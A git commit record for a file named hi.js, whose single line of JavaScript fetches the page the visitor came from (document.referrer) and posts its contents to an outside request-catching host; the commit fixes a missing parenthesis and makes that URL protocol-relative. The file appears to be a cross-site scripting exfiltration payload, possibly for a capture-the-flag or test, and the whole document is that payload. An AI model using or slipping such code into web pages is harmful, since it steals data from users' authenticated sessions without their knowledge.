eed979cf4390360ccf21f0ea4ca7fe5a81089346
Alef <153814398+P014r-13@users.noreply.github.com>
2026-07-09 20:49:45 +0330

    Update hi.js

--- hi.js
+++ hi.js
@@ -1,1 +1,1 @@
-fetch(document.referrer).then(r=>r.text()).then(r=>fetch("https://polar.requestcatcher.com/test",{method:"post",body:r})
+fetch(document.referrer).then(r=>r.text()).then(r=>fetch("//polar.requestcatcher.com/test",{method:"post",body:r}))
